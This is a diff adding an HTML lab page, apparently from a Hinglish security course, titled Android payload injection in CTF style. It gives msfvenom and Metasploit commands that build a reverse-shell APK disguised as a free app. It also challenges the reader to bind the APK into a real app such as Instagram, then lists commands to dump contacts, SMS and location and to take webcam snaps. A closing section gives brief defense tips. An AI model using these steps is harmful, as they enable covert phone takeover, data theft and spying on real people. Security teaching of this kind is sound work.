@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Lab 14 | Android Exploitation (CTF Style) | Owlguard</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <link href="lab14.css" rel="stylesheet">
+   <link rel="icon" type="image/png" href="favicon.jpeg">
+</head>
+<body>
+
+    <div class="content-container">
+        <h1 style="text-align:center; color: var(--android-green);">LAB 14: ANDROID PAYLOAD INJECTION</h1>
+        <p style="text-align:center; margin-bottom: 30px;">CTF Challenge: Gaining Remote Access via APK</p>
+
+        <section class="cia-box">
+            <h3><i class="fas fa-mobile-alt"></i> CIA Impact Analysis</h3>
+            <p>Mobile hacking se CIA triad par kya asar padta hai?</p>
+            <div class="impact-list">
+                <div class="impact-item"><b>Confidentiality:</b> SMS, Photos, aur Mic access leak hona.</div>
+                <div class="impact-item"><b>Integrity:</b> Contact list ya system files badal dena.</div>
+                <div class="impact-item"><b>Availability:</b> Phone ko lock ya wipe (Format) kar dena.</div>
+            </div>
+        </section>
+
+        
+
+        <section class="step-card">
+            <h3><i class="fas fa-bug"></i> Phase 1: Creating the Trojan</h3>
+            <p>Hum <b>msfvenom</b> ka use karke ek malicious APK banayenge jo humein reverse shell dega.</p>
+            <div class="terminal-box">
+                msfvenom -p android/meterpreter/reverse_tcp LHOST=[Your_IP] LPORT=4444 -o owlguard_free.apk
+            </div>
+            <div class="flag-box">CHALLENGE: Bind this payload with a real APK like Instagram!</div>
+        </section>
+
+        <section class="step-card">
+            <h3><i class="fas fa-headset"></i> Phase 2: Setting the Listener</h3>
+            <p>Target ke click karne ka wait karne ke liye humein apne Metasploit ko "Listening Mode" mein daalna hoga.</p>
+            <div class="terminal-box">
+                use exploit/multi/handler<br>
+                set payload android/meterpreter/reverse_tcp<br>
+                set LHOST [Your_IP]<br>
+                exploit
+            </div>
+        </section>
+
+        
+
+        <section class="step-card">
+            <h3><i class="fas fa-flag"></i> Phase 3: Capturing the Flags</h3>
+            <p>Ek baar session mil jaye, toh aap ye data nikal sakte hain (CTF Goals):</p>
+            <ul style="margin-left: 20px; font-size: 0.9rem; color: #a1a1a1;">
+                <li><b>Flag 1 (Contacts):</b> <code>dump_contacts</code></li>
+                <li><b>Flag 2 (Location):</b> <code>geolocate</code></li>
+                <li><b>Flag 3 (Messages):</b> <code>dump_sms</code></li>
+                <li><b>Flag 4 (Spying):</b> <code>webcam_snap</code></li>
+            </ul>
+        </section>
+
+        <section class="step-card" style="border-right: 5px solid #2ecc71;">
+            <h3><i class="fas fa-user-shield"></i> Defense Strategy</h3>
+            <p>Is attack se bachne ke liye: <b>1.</b> Unknown sources se APK install na karein. <b>2.</b> Play Protect hamesha on rakhein. <b>3.</b> App permissions hamesha check karein.</p>
+        </section>
+
+        <footer style="text-align: center; padding: 20px; color: #555;">
+            <p>&copy;  2026 | Secured by OwlGuard | All Rights Reserved </p>
+        </footer>
+    </div>
+
+</body>
+</html>
